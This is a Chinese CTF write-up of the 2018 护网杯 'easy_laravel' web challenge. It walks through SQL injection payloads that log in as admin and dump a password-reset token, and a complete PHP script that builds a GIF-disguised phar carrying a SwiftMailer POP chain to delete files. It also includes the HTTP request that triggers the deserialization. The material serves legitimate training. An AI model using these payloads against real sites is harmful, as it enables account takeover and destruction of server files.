---
title: 护网杯 2018 - Web - easy_laravel
date: 2026-11-14 18:28:00
categories:
  - CTF
  - 护网杯 2018
  - Web
tags:
  - Laravel 代码审计
  - SQL 注入
  - Blade 模板缓存
  - phar 反序列化
  - POP 链
cover: /img/cover/girl-window-white-flowers.jpg
description: 护网杯 2018 Laravel 综合题：HTML 注释泄漏源码，sqlite 注入取重置 token 接管 admin，算 Blade 缓存路径借 phar 反序列化删缓存，重渲染读 flag。
keywords:
  - Laravel
  - phar 反序列化
  - Blade 缓存
  - SQL 注入
  - 密码重置
ai: >-
  本题是护网杯 2018 的 Web 综合题 easy_laravel，考察 Laravel 代码审计与多环节漏洞串联。首页 HTML 注释泄漏仓库地址，审计发现 NoteController 的 name 字段存在 SQL 注入、UploadController 的 check 方法两个参数可控可触发 phar 反序列化、FlagController 读取服务器上的 flag 文件。buuoj 复现环境为 apache 加 sqlite，web 根目录与 SQL 注释符都与原题 nginx 加 mysql 不同。利用链先用注入登录 admin 并 dump 出 password_resets 表中的重置 token，接管后台后因 Blade 模板编译缓存过期导致 flag 页显示 no flag；再按视图完整路径的 sha1 算出缓存文件名，构造 Swift_ByteStream_TemporaryFileByteStream 析构触发 unlink 的 POP 链，生成伪装 GIF 的 phar 上传，借 check 的 file_exists 触发反序列化删除缓存，重新渲染即读到 flag。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 护网杯 2018 |
| 方向 | Web |
| 难度 | 中等偏难 |
| 环境 | 授权靶场（已脱敏） |

## 信息收集

### 源码泄露

首页 HTML 注释泄露源码地址：`<!-- code: https://github.com/qqqqqqvq/easy_laravel -->`。审计源码发现：

- `NoteController` 存在 SQL 注入（`name` 字段直接拼入查询）。
- `UploadController::check()` 的 `file_exists()` 两个参数可控，可触发 phar 反序列化。
- `FlagController::showFlag()` 读取 `/th1s1s_F14g_2333333`。

### 环境差异（关键）

原题使用 nginx + mysql，buuoj 复现环境使用 **apache + sqlite**（PHP/5.6.40 + apache + sqlite）。这导致两个关键差异：

1. web 根目录从 `/usr/share/nginx/html` 变为 `/var/www/html`。
2. SQL 注入注释符不能用 `#`（sqlite），需用 `--`。

题目 note 里给出的提示「apache是坠吼的（好麻烦，默认配置也是坠吼的）」正是暗示这一差异。

## 漏洞分析

### SQL 注入（NoteController）

注册时 `name` 字段存在注入。管理员账号信息（来自 `ModelFactory.php`）：

```text
name: '4uuu Nya'
email: 'admin@qvq.im'
password: bcrypt(str_random(40))  # 40 位随机，无法爆破
```

注册用户名 `admin' or 1=1--` 登录后，note 页面显示 admin 的 note（提示 apache 环境）。注入 `admin' union select 1,'ZZZ',3,4,5--` 确定查询为 5 列，回显位是**第 2 列**。

### Blade 模板缓存过期

登录后台访问 `/flag` 显示 `no flag`。原因是 Blade 编译缓存未更新。`FlagController::showFlag()` 实际逻辑：

```php
$flag = file_get_contents('/th1s1s_F14g_2333333');
return view('auth.flag')->with('flag', $flag);
```

视图 `auth.flag` 对应 `resources/views/auth/flag.blade.php`，旧的编译缓存导致渲染结果不对。Blade 缓存文件名规则（`CompilerEngine::getCompiledPath`）为 `sha1(视图完整路径).php`：

```php
return $this->cachePath . '/' . sha1($path) . '.php';
```

计算 `sha1('/var/www/html/resources/views/auth/flag.blade.php') = 73eb5933be1eb2293500f4a74b45284fd453f0bb`，对应缓存文件 `/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php`。

> 注：原题 nginx 环境对应值为 `34e41df0934a75437873264cd28e2d835bc38772`（`sha1('/usr/share/nginx/html/resources/views/auth/flag.blade.php')`）。

### PHP 反序列化 POP 链

`Swift_ByteStream_TemporaryFileByteStream::__destruct` 存在 `unlink()`，可删除任意文件：

```php
class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
    public function __destruct() {
        if (file_exists($this->getPath())) {
            @unlink($this->getPath());
        }
    }
}
```

## 利用过程

1. **源码泄露** → 定位 SQL 注入点、phar 触发点与 flag 文件路径。
2. **SQL 注入登录**：注册 `admin' or 1=1--`，note 页提示 apache 环境。
3. **确定回显位**：`admin' union select 1,'ZZZ',3,4,5--` → 第 2 列。
4. **密码重置 token 注入**：先 `POST /password/email`，`email=admin@qvq.im`（返回 500 但 token 已插入 `password_resets` 表）；再注入 `admin' union select 1,(select token from password_resets limit 0,1),3,4,5--` dump 出 token；访问 `/password/reset/{token}` 重置 admin 密码为 `AdminNew123`。
5. **登录后台**：upload、files、flag、note 四个功能，`/flag` 显示 `no flag`（Blade 缓存过期）。
6. **计算缓存路径**：按 `sha1(视图完整路径)` 得到上文的 `.php` 缓存文件。
7. **生成 phar**：构造 `Swift_ByteStream_TemporaryFileByteStream` 对象，metadata 指向缓存文件路径，stub 伪装 `GIF89a`（完整生成脚本见「完整 EXP」）。生成时需关闭 `phar.readonly`：`php -d phar.readonly=0 gen_phar.php`。
8. **上传并触发反序列化**：上传 `1.gif`（phar 伪装）→ 存储到 `storage/app/public/1.gif`；`check` 功能触发 `file_exists(path + filename)`，`path` 参数可控，`file_exists('phar:///var/www/html/storage/app/public/1.gif')` 触发反序列化，`__destruct` 执行 `unlink` 删除 Blade 缓存。
9. **重新访问 /flag**：缓存删除后视图重新渲染，`file_get_contents` 读出 flag。

## 完整 EXP

生成 phar 的 PHP 脚本（metadata 为删缓存的对象，stub 伪装 GIF89a）：

```php
class Swift_ByteStream_AbstractFilterableInputStream {}
class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream {
    private $_path;
    public function __construct($path, $writable = false) {
        $this->_path = $path;
    }
    public function getPath() { return $this->_path; }
}
class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
    public function __construct() {
        parent::__construct("/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php", true);
    }
    public function __destruct() {
        if (file_exists($this->getPath())) @unlink($this->getPath());
    }
}

$obj = new Swift_ByteStream_TemporaryFileByteStream();
$p = new Phar('./1.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$p->setMetadata($obj);
$p->addFromString('1.txt', 'text');
$p->stopBuffering();
rename('./1.phar', '1.gif');
```

上传后触发反序列化的请求（`path` 参数指向 phar 伪协议）：

```http
POST /check HTTP/1.1
Host: target:8080

filename=/1.gif&path=phar:///var/www/html/storage/app/public/1.gif
```

## Flag

```text
flag{xxxx}
```

（缓存删除后重新渲染 `/flag` 读出，真实值已脱敏。）

## 踩坑与总结

完整攻击链：

```text
源码泄露 → SQL 注入（name 字段）
  → 确定回显位（第 2 列）
  → 触发密码重置 → 注入 dump token
  → 重置 admin 密码 → 登录后台
  → /flag 显示 no flag（Blade 缓存过期）
  → 计算缓存文件 sha1 → 生成 phar（Swift_ByteStream_TemporaryFileByteStream）
  → 上传 phar → check 触发 file_exists(phar://) 反序列化
  → 删除缓存 → 重新渲染读 flag
```

关键点：

- buuoj 环境是 apache + sqlite，注意路径和注释符差异（`- -` 注释、`/var/www/html` 根目录）。
- Blade 缓存文件名是 `sha1(视图完整路径)`，视图名 `auth.flag` 带命名空间目录。
- phar 反序列化通过 `file_exists(phar://...)` 触发，`check()` 的 `path` 参数可控；PHP 析构中的 `unlink` 是删缓存的 sink。
